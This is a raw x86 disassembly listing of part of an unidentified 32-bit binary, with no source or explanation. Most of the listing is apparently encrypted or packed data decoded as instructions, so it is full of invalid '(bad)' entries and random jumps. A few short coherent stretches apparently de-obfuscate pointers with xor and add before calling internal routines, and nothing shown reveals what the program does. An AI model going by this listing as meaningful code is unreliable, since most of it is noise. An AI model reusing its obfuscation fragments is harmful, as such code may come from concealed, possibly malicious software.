  407ab7:	(bad)
  407aba:	fdiv   DWORD PTR [ecx-0x8]
  407abd:	pushf  
  407abe:	dec    edi
  407abf:	loopne 0x407a57
  407ac1:	push   ecx
  407ac2:	cmp    al,0x72
  407ac4:	push   edx
  407ac5:	ins    DWORD PTR es:[edi],dx
  407ac6:	jnp    0x407a5d
  407ac8:	and    DWORD PTR [eax],esi
  407aca:	cmp    ch,BYTE PTR [ebx+0x49f531d8]
  407ad0:	int3   
  407ad1:	fcomp  DWORD PTR ss:[esp+eiz*2]
  407ad5:	cs ret 0xfd6e
  407ad9:	mov    bl,BYTE PTR [ecx+edi*1]
  407adc:	scas   al,BYTE PTR es:[edi]
  407add:	or     dl,BYTE PTR [ebx]
  407adf:	dec    ebx
  407ae0:	(bad)  [edx]
  407ae2:	dec    ebp
  407ae3:	xchg   esi,eax
  407ae4:	mov    DWORD PTR gs:[ecx],ecx
  407ae7:	xor    edi,edx
  407ae9:	lods   eax,DWORD PTR ds:[esi]
  407aea:	or     al,0xf0
  407aec:	xchg   edi,eax
  407aed:	and    BYTE PTR [ebx],dl
  407aef:	mov    cl,0xf4
  407af1:	jle    0x407b47
  407af3:	mov    bh,0xbb
  407af5:	xchg   esp,eax
  407af6:	inc    edx
  407af7:	mov    eax,ds:0x9838d896
  407afc:	in     al,0xff
  407afe:	lea    ebp,[eax+0x59]
  407b01:	add    BYTE PTR [ecx-0x620ddca5],bh
  407b07:	sbb    ebx,0x103ebaae
  407b0d:	sbb    BYTE PTR [ebx-0x6f9dcb90],bh
  407b13:	add    al,0x8
  407b15:	xor    eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	hlt    
  407b40:	les    eax,FWORD PTR ds:0x70c95748
  407b46:	jo     0x407b68
  407b48:	jge    0x407bba
  407b4a:	jo     0x407baa
  407b4c:	jp     0x407b29
  407b4e:	sbb    ch,BYTE PTR [ebx]
  407b50:	xchg   BYTE PTR [ebx+eiz*4],ah
  407b53:	ds mov eax,0xe150a715
  407b59:	je     0x407b60
  407b5b:	sub    DWORD PTR [edx],edi
  407b5d:	cld    
  407b5e:	and    al,0xff
  407b60:	jp     0x407b42
  407b62:	mov    ds:0x45e53cc,al
  407b67:	jg     0x407b57
  407b69:	jae    0x407af8
  407b6b:	mov    BYTE PTR [edi],cl
  407b6d:	sbb    ecx,DWORD PTR [esi-0x901160]
  407b73:	imul   DWORD PTR [ebx+0x29]
  407b76:	dec    esp
  407b77:	mov    ebx,0x37626a8a
  407b7c:	xchg   ebx,eax
  407b7d:	push   ebp
  407b7e:	les    ebx,FWORD PTR [ebp-0x76]
  407b81:	test   eax,ebp
  407b83:	iret   
  407b84:	or     al,0xb0
  407b86:	xchg   ebp,eax
  407b87:	add    eax,0x392e1080
  407b8c:	xcrypt-cfb (bad)
  407b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b8e:	mov    eax,ds:0x4d06e6f4
  407b93:	aaa    
  407b94:	cmp    al,0x9d
  407b96:	addr16 adc ebp,esi
  407b99:	dec    ecx
  407b9a:	pop    ds
  407b9b:	pushf  
  407b9c:	js     0x407b9e
  407b9e:	dec    ebp
  407b9f:	add    DWORD PTR [esi-0x5a],0x1499ecc2
  407ba6:	mov    ebx,0x19f74ce3
  407bab:	fwait
  407bac:	in     al,0x2
  407bae:	jle    0x407b87
  407bb0:	inc    ebp
  407bb1:	add    al,0xcf
  407bb3:	xor    eax,0x507471ee
  407bb8:	(bad)  [ecx-0x6020450c]
  407bbe:	(bad)  
  407bbf:	sub    DWORD PTR [ebp+0x1],ebx
  407bc2:	inc    edi
  407bc3:	push   ss
  407bc4:	popf   
  407bc5:	lea    eax,[esi+edi*8-0x216ef62f]
  407bcc:	in     al,0x93
  407bce:	shr    esi,1
  407bd0:	inc    ebx
  407bd1:	repz test DWORD PTR [esp+eiz*2+0x7e9615f4],ebp
  407bd9:	stos   BYTE PTR es:[edi],al
  407bda:	pop    eax
  407bdb:	imul   edi,DWORD PTR [edi],0xe758d05d
  407be1:	adc    al,0xb1
  407be3:	adc    DWORD PTR [ecx-0x1a],esi
  407be6:	and    DWORD PTR [edx+esi*1],edx
  407be9:	loope  0x407c02
  407beb:	xlat   BYTE PTR ds:[ebx]
  407bec:	sub    DWORD PTR [edx+0xfb8949a],edi
  407bf2:	out    dx,al
  407bf3:	cmp    cl,0x97
  407bf6:	cdq    
  407bf7:	adc    al,0x15
  407bf9:	inc    eax
  407bfa:	jmp    0x407c3d
  407bfc:	cmp    edx,esi
  407bfe:	or     DWORD PTR [ebp+0x1576c4b2],ecx
  407c04:	pop    ebx
  407c05:	mov    dl,0x35
  407c07:	mov    dl,0x38
  407c09:	xchg   esi,eax
  407c0a:	push   edx
  407c0b:	inc    ecx
  407c0c:	pop    ebp
  407c0d:	cmp    ebx,DWORD PTR [edx+eiz*1-0x5e811dae]
  407c14:	ss into 
  407c16:	sub    eax,0x9f47fa0b
  407c1b:	(bad)  
  407c1c:	sub    ebx,DWORD PTR ds:0xaaae9162
  407c22:	(bad)  
  407c23:	mov    ecx,0xe1f517eb
  407c28:	iret   
  407c29:	lea    esi,[eax+edi*1+0x2a]
  407c2d:	push   esi
  407c2e:	mov    bh,0x9
  407c30:	jae    0x407c94
  407c32:	sub    ah,cl
  407c34:	mov    edi,ebx
  407c36:	inc    esi
  407c37:	(bad)  [ebx]
  407c39:	frndint 
  407c3b:	popf   
  407c3c:	inc    ebx
  407c3d:	hlt    
  407c3e:	js     0x407bc8
  407c40:	push   ecx
  407c41:	push   es
  407c42:	mov    edx,0x4f953048
  407c47:	add    ebx,eax
  407c49:	mov    bh,0x10
  407c4b:	mov    ds,WORD PTR [ebp-0x16886dd0]
  407c51:	jo     0x407c9d
  407c53:	inc    edi
  407c54:	fistp  WORD PTR [ecx+0x59]
  407c57:	inc    esp
  407c58:	and    dl,0x3b
  407c5b:	dec    esi
  407c5c:	iret   
  407c5d:	or     ch,BYTE PTR [esi-0x6ab885c4]
  407c63:	pop    ds
  407c64:	call   0x8c017189
  407c69:	pusha  
  407c6a:	jge    0x407c17
  407c6c:	cmc    
  407c6d:	lock adc eax,0x89a60f28
  407c73:	loopne 0x407c0c
  407c75:	pop    edx
  407c76:	mov    al,ds:0x47c053f1
  407c7b:	addr16 push eax
  407c7d:	and    DWORD PTR [esi],esi
  407c7f:	rol    DWORD PTR [ecx+0x41],1
  407c82:	aad    0x36
  407c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c85:	mov    eax,ds:0x335d3658
  407c8a:	jne    0x407cc1
  407c8c:	das    
  407c8d:	inc    edx
  407c8e:	mov    edx,0x6e90a7e5
  407c93:	or     al,0x83
  407c95:	mov    BYTE PTR [esi-0x539c158f],ah
  407c9b:	jae    0x407c62
  407c9d:	aaa    
  407c9e:	jge    0x407c23
  407ca0:	or     DWORD PTR ss:[eax+0x5b],ebp
  407ca4:	stos   BYTE PTR es:[edi],al
  407ca5:	cld    
  407ca6:	mov    ebp,0x3d4610f3
  407cab:	fst    DWORD PTR [eax-0x10]
  407cae:	cwde   
  407caf:	es retf 0x9d5a
  407cb3:	int3   
  407cb4:	(bad)  [ebx+0x17ab132b]
  407cba:	mov    eax,0x97929e47
  407cbf:	xlat   BYTE PTR ds:[ebx]
  407cc0:	adc    cl,cl
  407cc2:	add    BYTE PTR [ecx+0x14c51022],0xf3
  407cc9:	stos   DWORD PTR es:[edi],eax
  407cca:	nop
  407ccb:	mov    ebp,0x100dec1d
  407cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cd1:	jns    0x407c62
  407cd3:	stos   DWORD PTR es:[edi],eax
  407cd4:	(bad)  
  407cd5:	ins    DWORD PTR es:[edi],dx
  407cd6:	addr16 cdq 
  407cd8:	or     edx,DWORD PTR [ebx]
  407cda:	xor    ah,BYTE PTR [eax+0x18cc5f19]
  407ce0:	jmp    0x407ca1
  407ce2:	fwait
  407ce3:	ss cwde 
  407ce5:	inc    ecx
  407ce6:	mov    esi,0xc7f55263
  407ceb:	cmp    cl,BYTE PTR [edx]
  407ced:	sub    ecx,DWORD PTR [ecx+0x32efe8fc]
  407cf3:	retf   0x4e9
  407cf6:	cmc    
  407cf7:	pop    ebp
  407cf8:	push   ebp
  407cf9:	fcom   DWORD PTR ds:0xf043564e
  407cff:	stc    
  407d00:	pusha  
  407d01:	cli    
  407d02:	les    ecx,FWORD PTR [edi+0x73]
  407d05:	loopne 0x407cdc
  407d07:	push   0x488d0364
  407d0c:	pusha  
  407d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d0e:	inc    ebp
  407d0f:	sbb    al,0x38
  407d11:	fistp  DWORD PTR [ecx+0x5b33b024]
  407d17:	xchg   edi,eax
  407d18:	add    eax,0xa02c3bfe
  407d1d:	xchg   BYTE PTR [bx+di+0x44],ch
  407d21:	mov    esp,0x25e3fd82
  407d26:	push   ebp
  407d27:	xchg   ecx,eax
  407d28:	cmp    BYTE PTR [ebp+edx*2-0x611b0a6a],ah
  407d2f:	fadd   DWORD PTR [edi-0x59]
  407d32:	les    esp,FWORD PTR [eax-0x444e6f4e]
  407d38:	inc    edx
  407d39:	inc    esp
  407d3a:	mov    BYTE PTR [ebp+0x6d665ff5],ch
  407d40:	xchg   BYTE PTR [ecx-0x32],ch
  407d43:	pop    ecx
  407d44:	mov    ds:0x97bffa3c,al
  407d49:	imul   ecx,DWORD PTR [ebx+eiz*1],0xffffffe0
  407d4d:	in     eax,dx
  407d4e:	inc    ebp
  407d4f:	leave  
  407d50:	lods   al,BYTE PTR ds:[esi]
  407d51:	xlat   BYTE PTR ds:[ebx]
  407d52:	fimul  DWORD PTR [esi+0x34]
  407d55:	jmp    0x407cf2
  407d57:	mov    ch,0x65
  407d59:	cmp    esi,DWORD PTR [eax+0x2d1c551d]
  407d5f:	xchg   ecx,eax
  407d60:	inc    esp
  407d61:	sbb    DWORD PTR [ebx-0x33],esi
  407d64:	gs mov bl,0xab
  407d67:	jmp    ebp
  407d69:	jecxz  0x407d77
  407d6b:	adc    DWORD PTR [esi],0x6a96f53c
  407d71:	or     eax,0x4a441cf0
  407d76:	cld    
  407d77:	sub    al,0x7f
  407d79:	pop    ds
  407d7a:	retf   
  407d7b:	jmp    0x381e6053
  407d80:	test   DWORD PTR [ecx+0x7473c4ef],edi
  407d86:	retf   
  407d87:	add    eax,0x8602bf94
  407d8c:	mov    DWORD PTR [esp],esp
  407d8f:	stos   BYTE PTR es:[edi],al
  407d90:	out    dx,eax
  407d91:	(bad)  
  407d93:	rcl    BYTE PTR [ecx],cl
  407d95:	mov    dl,0x2d
  407d97:	sbb    esp,DWORD PTR [edi-0x67]
  407d9a:	and    eax,0x4e90eae
  407d9f:	pop    ss
  407da0:	in     al,dx
  407da1:	gs push 0x5f97ddeb
  407da7:	push   edx
  407da8:	lock sahf 
  407daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dab:	mov    ebp,0x34b83570
  407db0:	into   
  407db1:	fwait
  407db2:	icebp  
  407db3:	push   ds
  407db4:	nop
  407db5:	neg    BYTE PTR [ebp+0x45732234]
  407dbb:	sahf   
  407dbc:	push   DWORD PTR [esi+0x6291874b]
  407dc2:	scas   eax,DWORD PTR es:[edi]
  407dc3:	pop    edx
  407dc4:	mov    ebp,0x4b1eaef3
  407dc9:	xchg   BYTE PTR [eax+0x2],dh
  407dcc:	mov    ah,0xc1
  407dce:	clc    
  407dcf:	and    bl,ah
  407dd1:	jns    0x407d73
  407dd3:	out    0x44,al
  407dd5:	mov    esi,0x1a74b728
  407dda:	dec    ebp
  407ddb:	(bad)  
  407ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ddd:	jg     0x407e4e
  407ddf:	jmp    0x7ba74a14
  407de4:	sub    BYTE PTR [ecx+0x47eb9f41],ah
  407dea:	add    eax,0x8b41f9e1
  407def:	enter  0xdc1c,0x58
  407df3:	test   BYTE PTR [esi+0x4b3d98de],ah
  407df9:	je     0x407e33
  407dfb:	cld    
  407dfc:	pop    esi
  407dfd:	enter  0x689e,0xeb
  407e01:	xor    ah,dh
  407e03:	pop    ss
  407e04:	mov    edi,esi
  407e06:	cmp    edx,DWORD PTR [esi+edi*4+0x7311b90f]
  407e0d:	aad    0x9f
  407e0f:	pop    esi
  407e10:	jmp    0x913:0x9edc2581
  407e17:	inc    edx
  407e18:	imul   esp,DWORD PTR [edx+0x14a1130d],0x2b
  407e1f:	shl    BYTE PTR [edx-0x3d6edc7],0xb
  407e26:	xor    esp,DWORD PTR [ecx]
  407e28:	inc    edx
  407e29:	or     BYTE PTR [ecx+eiz*2+0x29517af7],bl
  407e30:	les    ebp,FWORD PTR [ebx]
  407e32:	mov    ds:0x71a452ce,al
  407e37:	(bad)  
  407e39:	and    bl,dh
  407e3b:	pmuludq mm0,QWORD PTR [edi]
  407e3e:	add    ecx,DWORD PTR [esi]
  407e40:	in     ax,dx
  407e42:	add    al,0x9a
  407e44:	inc    edx
  407e45:	loope  0x407e18
  407e47:	pusha  
  407e48:	sahf   
  407e49:	clc    
  407e4a:	mov    eax,ds:0xea57c3bd
  407e4f:	jmp    0x21bb:0xa49bef76
  407e56:	or     BYTE PTR [edx+ecx*2],ch
  407e59:	div    BYTE PTR [ebp-0x16]
  407e5c:	les    ebx,FWORD PTR [ebx-0x1ef981b]
  407e62:	push   0xda708fa
  407e67:	les    esi,FWORD PTR [ecx]
  407e69:	enter  0xc471,0xff
  407e6d:	inc    esi
  407e6e:	in     al,0x91
  407e70:	pop    esp
  407e71:	or     al,0x67
  407e73:	iret   
  407e74:	xchg   edi,eax
  407e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e76:	mov    BYTE PTR [edi-0x17da1a9a],bh
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	jbe    0x407e8a
  407e9a:	jns    0x407e8b
  407e9c:	pop    es
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407ecf
  407ea5:	loopne 0x407edc
  407ea7:	ret    
  407ea8:	out    0xfe,al
  407eaa:	(bad)  
  407eab:	call   0x450bfb33
  407eb0:	(bad)  
  407eb1:	or     al,0x33
  407eb3:	jb     0x407e3b
  407eb5:	div    DWORD PTR [ebx-0x438bcca4]
  407ebb:	ret    
  407ebc:	out    0xfd,al
  407ebe:	mov    esp,DWORD PTR [eax+0x74]
  407ec1:	or     eax,0x84906bcc
  407ec6:	ins    BYTE PTR es:[edi],dx
  407ec7:	std    
  407ec8:	retf   
  407ec9:	clc    
  407eca:	(bad)  
  407ecb:	push   ebp
  407ecc:	icebp  
  407ecd:	stos   BYTE PTR es:[edi],al
  407ece:	and    eax,0xa38697ef
  407ed3:	cmp    al,0x32
  407ed5:	jb     0x407f31
  407ed7:	imul   esp,DWORD PTR [ebp-0x2f1c721a],0xffffffd4
  407ede:	xor    ah,cl
  407ee0:	jmp    DWORD PTR [esi+0x73]
  407ee3:	fs mov dh,0x9e
  407ee6:	mov    eax,ds:0x6dedf22
  407eeb:	fisttp WORD PTR [edx-0x3969f18f]
  407ef1:	add    ch,BYTE PTR [edi]
  407ef3:	adc    dl,cl
  407ef5:	cli    
  407ef6:	mov    bl,BYTE PTR [ebx]
  407ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ef9:	nop
  407efa:	mov    bl,0xc7
  407efc:	inc    ecx
  407efd:	pop    eax
  407efe:	dec    edx
  407eff:	fdiv   DWORD PTR [esi+eiz*4-0x7ffdd374]
  407f06:	sub    edx,eax
  407f08:	sub    DWORD PTR [ecx],esi
  407f0a:	(bad)
  407f0d:	sub    edi,DWORD PTR [ecx]
  407f0f:	adc    al,dl
  407f11:	mov    al,ds:0x9633b06a
  407f16:	dec    ecx
  407f17:	pop    es
  407f18:	push   esi
  407f19:	push   ecx
  407f1a:	xchg   ebp,eax
  407f1b:	pop    es
  407f1c:	xor    eax,0xce92cd91
  407f21:	mov    dh,BYTE PTR [ebx-0x7f]
  407f24:	xchg   ebx,eax
  407f25:	mov    dh,0x1d
  407f27:	or     al,0x34
  407f29:	sbb    ch,BYTE PTR [eax]
  407f2b:	pop    ds
  407f2c:	test   DWORD PTR [eax],0xaf9b466b
  407f32:	imul   ecx,esi,0x34
  407f35:	xor    ecx,DWORD PTR [edi+edx*8]
  407f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f39:	adc    DWORD PTR [eax+0x4],esp
  407f3c:	ins    DWORD PTR es:[edi],dx
  407f3d:	scas   eax,DWORD PTR es:[edi]
  407f3e:	add    ecx,DWORD PTR ds:0x332ce8cd
  407f44:	retf   
  407f45:	dec    edi
  407f46:	ret    0xdb41
  407f49:	jns    0x407f83
  407f4b:	pop    eax
  407f4c:	daa    
  407f4d:	sahf   
  407f4e:	jmp    0x7602:0x7dc8999
  407f55:	fdivr  st,st(0)
  407f57:	mov    ds:0x8212ab36,al
  407f5c:	inc    ebx
  407f5d:	push   eax
  407f5e:	out    dx,al
  407f5f:	push   eax
  407f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f61:	shr    DWORD PTR [ecx],0x73
  407f64:	push   esi
  407f65:	xchg   esp,eax
  407f66:	test   eax,0x6821caf4
  407f6b:	xchg   ebp,eax
  407f6c:	dec    esp
  407f6d:	mov    esp,0xbd682522
  407f72:	or     al,0x53
  407f74:	inc    ebx
  407f75:	pop    eax
  407f76:	cmp    BYTE PTR [ebp-0x337cb7f4],cl
  407f7c:	push   ss
  407f7d:	in     eax,0x78
  407f7f:	cmp    eax,0xf27bb3de
  407f84:	mov    fs,WORD PTR [ebx]
  407f86:	in     al,0x97
  407f88:	ins    DWORD PTR es:[edi],dx
  407f89:	add    al,0xaf
  407f8b:	sbb    DWORD PTR [ecx-0x12],edx
  407f8e:	pop    eax
  407f8f:	rcl    DWORD PTR [edi+0x1e],1
  407f92:	mov    es,WORD PTR [eax+0x63cf763]
  407f98:	out    0xf1,eax
  407f9a:	(bad)  
  407f9b:	(bad)  
  407f9c:	cmc    
  407f9d:	outs   dx,BYTE PTR ds:[esi]
  407f9e:	inc    ecx
  407f9f:	cmc    
  407fa0:	adc    esi,ebx
  407fa2:	call   0x52e17c2e
  407fa7:	add    DWORD PTR [ebx-0x465f8f04],eax
  407fad:	inc    ebx
  407fae:	push   es
  407faf:	pop    esp
  407fb0:	scas   al,BYTE PTR es:[edi]
  407fb1:	or     ebp,0x23
  407fb4:	mov    ebp,0xef382de0
  407fb9:	int    0x7
  407fbb:	xchg   DWORD PTR [esi],esi
  407fbd:	sbb    edx,DWORD PTR [esi-0x48]
  407fc0:	xor    cl,al
  407fc2:	jecxz  0x407f8c
  407fc4:	inc    sp
  407fc6:	cs ret 0x40c9
  407fca:	mov    esi,0x3838b13f
  407fcf:	std    
  407fd0:	mov    bl,0x9e
  407fd2:	jge    0x40804b
  407fd4:	aaa    
  407fd5:	test   DWORD PTR [ecx],esi
  407fd7:	in     al,dx
  407fd8:	ja     0x40802f
  407fda:	mov    dl,0x86
  407fdc:	sub    BYTE PTR ds:[ebx-0x44a13ffe],ch
  407fe3:	add    DWORD PTR [edx+eax*1],ebp
  407fe6:	adc    bl,cl
  407fe8:	mov    esi,es
  407fea:	adc    DWORD PTR [ebp+ebp*1+0x456a26a1],ebx
  407ff1:	xor    dh,BYTE PTR [esi]
  407ff3:	xchg   ebx,eax
  407ff4:	sub    BYTE PTR [edx-0x7a3cce69],bh
  407ffa:	into   
  407ffb:	pop    edx
  407ffc:	inc    ebp
  407ffd:	add    DWORD PTR [edx],ebp
  407fff:	mov    ds:0xd8a6a604,al
  408004:	fisttp DWORD PTR [edx-0x5a0e136f]
  40800a:	lea    edx,[edx+0x6d]
  40800d:	dec    esi
  40800e:	xor    DWORD PTR [edx],edx
  408010:	inc    esp
  408011:	pop    ebp
  408012:	dec    ecx
  408013:	in     eax,dx
  408014:	mov    eax,ds:0xa921fb46
  408019:	pop    esp
  40801a:	or     al,BYTE PTR [ecx-0x5bfab83e]
  408020:	mov    ah,0x9d
  408022:	dec    ecx
  408023:	dec    ecx
  408024:	std    
  408025:	xor    bl,BYTE PTR ds:0xf373bcf2
  40802b:	mov    ch,0x15
  40802d:	mov    bh,0x45
  40802f:	shl    BYTE PTR [ecx-0x27],cl
  408032:	and    al,BYTE PTR [esi+0x5a]
  408035:	and    BYTE PTR [esi+0x1d67c83b],cl
  40803b:	cmp    DWORD PTR [esi+0x753370fe],ebx
  408041:	jnp    0x40801d
  408043:	lock fxch st(5)
  408046:	and    al,0xbf
  408048:	xchg   edi,eax
  408049:	jle    0x407ffa
  40804b:	ss in  eax,dx
  40804d:	fidiv  WORD PTR [edi]
  40804f:	repz cli 
  408051:	sti    
  408052:	xchg   edi,eax
  408053:	js     0x4080cc
  408055:	mov    DWORD PTR [edi-0x6d],eax
  408058:	pop    eax
  408059:	neg    DWORD PTR [ecx]
  40805b:	iret   
  40805c:	daa    
  40805d:	dec    eax
  40805e:	jae    0x408005
  408060:	add    edi,ebx
  408062:	inc    BYTE PTR ds:0x2eb3210a
  408068:	stos   DWORD PTR es:[edi],eax
  408069:	jecxz  0x4080a7
  40806b:	clc    
  40806c:	mov    bh,0x5c
  40806e:	push   cs
  40806f:	stos   BYTE PTR es:[edi],al
  408070:	mov    dh,0xe9
  408072:	pop    esi
  408073:	inc    ebx
  408074:	das    
  408075:	push   ebx
  408076:	pushf  
  408077:	inc    ebp
  408078:	mov    esp,0x52c4cea0
  40807d:	add    ebx,esi
  40807f:	push   ds
  408080:	cmovo  ebx,DWORD PTR [ebp+ebp*1+0x56]
  408085:	adc    ebx,DWORD PTR [ebp+eax*4-0x7f]
  408089:	(bad)  
  40808a:	add    eax,edx
  40808c:	iret   
  40808d:	cld    
  40808e:	arpl   WORD PTR [ebx],sp
  408090:	cli    
  408091:	jnp    0x408092
  408093:	mov    eax,ds:0x9551d1ff
  408098:	in     al,dx
  408099:	lods   eax,DWORD PTR ds:[esi]
  40809a:	shl    DWORD PTR [ecx-0x59aaf2a5],0x8e
  4080a1:	or     BYTE PTR [edx+0x5dd811ef],ch
  4080a7:	xor    eax,0x87c6fe6a
  4080ac:	jbe    0x40803b
  4080ae:	or     al,0x77
  4080b0:	test   DWORD PTR ds:0x1d9e712d,ecx
  4080b6:	shl    cl,0xbf
  4080b9:	push   ss
  4080ba:	adc    eax,0x663a9207
  4080bf:	mov    dh,0x56
  4080c1:	ds push 0x6
  4080c4:	mov    esi,0x91567671
  4080c9:	not    DWORD PTR [edi]
  4080cb:	add    BYTE PTR [ebp+0xc],al
  4080ce:	sti    
  4080cf:	xchg   edx,eax
  4080d0:	pop    ss
  4080d1:	call   0x891859c6
  4080d6:	test   BYTE PTR [bp+si-0x32],dl
  4080da:	das    
  4080db:	or     DWORD PTR [esi+0x2c80a831],0xb191b5ab
  4080e5:	pop    ecx
  4080e6:	nop
  4080e7:	add    ah,dl
  4080e9:	stc    
  4080ea:	mul    DWORD PTR [edx]
  4080ec:	stos   DWORD PTR es:[edi],eax
  4080ed:	jae    0x4080dc
  4080ef:	call   0x3007ec89
  4080f4:	fmul   QWORD PTR [edi]
  4080f6:	sub    al,0x84
  4080f8:	add    al,0x39
  4080fa:	into   
  4080fb:	xchg   ecx,eax
  4080fc:	jbe    0x408102
  4080fe:	imul   eax,esi,0x24d1a768
  408104:	or     al,0x53
  408106:	arpl   WORD PTR [edx],dx
  408108:	not    BYTE PTR [ebp+0x1cf392d]
  40810e:	nop
  40810f:	ret    
  408110:	cwde   
  408111:	sub    eax,0x4b7302f9
  408116:	xor    eax,0x7fd75c85
  40811b:	or     eax,0xd41a5997
  408120:	or     ecx,ebp
  408122:	shr    BYTE PTR [edx-0x2893aea3],0xf1
  408129:	xchg   edi,eax
  40812a:	test   DWORD PTR [ebx-0x2a],esi
  40812d:	fcom   QWORD PTR [ebx-0x1d]
  408130:	inc    ecx
  408131:	mov    eax,ds:0x67ede2c6
  408136:	xchg   ebx,eax
  408137:	pushf  
  408138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408139:	dec    esp
  40813a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40813b:	cmp    esp,DWORD PTR [edx]
  40813d:	pop    ds
  40813e:	jl     0x40816f
  408140:	push   cs
  408141:	pop    ss
  408142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408143:	inc    ecx
  408144:	jmp    0x201b:0x1f7a98ba
  40814b:	icebp  
  40814c:	mov    BYTE PTR [eax+esi*2-0x42],dh
  408150:	rcr    cl,cl
  408152:	addr16 cmp eax,0xd8500b48
  408158:	jl     0x4081bc
  40815a:	loopne 0x4081b4
  40815c:	push   esp
  40815d:	xor    al,0x3d
  40815f:	leave  
  408160:	stos   BYTE PTR es:[edi],al
  408161:	ins    BYTE PTR es:[edi],dx
  408162:	and    eax,ebx
  408164:	retf   0xd3fa
  408167:	mov    cl,0x54
  408169:	xor    al,0x44
  40816b:	sub    DWORD PTR [ebx+0x796c018c],0xa
  408172:	jne    0x408181
  408174:	pop    eax
  408175:	ja     0x4081be
  408177:	(bad)  
  408178:	scas   eax,DWORD PTR es:[edi]
  408179:	ror    DWORD PTR [esi-0x643d0165],0x3a
  408180:	test   eax,0x725e3a0c
  408185:	jle    0x408143
  408187:	jne    0x40814c
  408189:	jecxz  0x40819c
  40818b:	push   ss
  40818c:	into   
  40818d:	cmp    BYTE PTR [edi+0x63],0xa2
  408191:	mov    cl,0x8d
  408193:	xchg   ebx,eax
  408194:	sub    ch,al
  408196:	pop    esp
  408197:	int3   
  408198:	aam    0x8c
  40819a:	iret   
  40819b:	std    
  40819c:	lea    edi,[ebp-0x47]
  40819f:	jo     0x4081a1
  4081a1:	mov    ch,0xa4
  4081a3:	xor    DWORD PTR [ecx-0x5179f18b],esp
  4081a9:	pop    ds
  4081aa:	xchg   esp,eax
  4081ab:	xlat   BYTE PTR ds:[ebx]
  4081ac:	hlt    
  4081ad:	stos   BYTE PTR es:[edi],al
  4081ae:	mov    cl,0x2a
  4081b0:	push   0x11
  4081b2:	and    dl,BYTE PTR [ecx]
  4081b4:	and    ecx,ebp
  4081b6:	icebp  
  4081b7:	mov    ebp,0x7098e6f6
  4081bc:	imul   esp,DWORD PTR [ecx-0x76],0xa10e1fee
  4081c3:	mov    cl,0xa
  4081c5:	aad    0x72
  4081c7:	dec    ecx
  4081c8:	or     bl,cl
  4081ca:	sbb    BYTE PTR [edi],bh
  4081cc:	mov    ebp,0xb2974668
  4081d1:	popa   
  4081d2:	fsub   st,st(4)
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	retf   
  408269:	inc    ecx
  40826a:	out    0x75,eax
  40826c:	aaa    
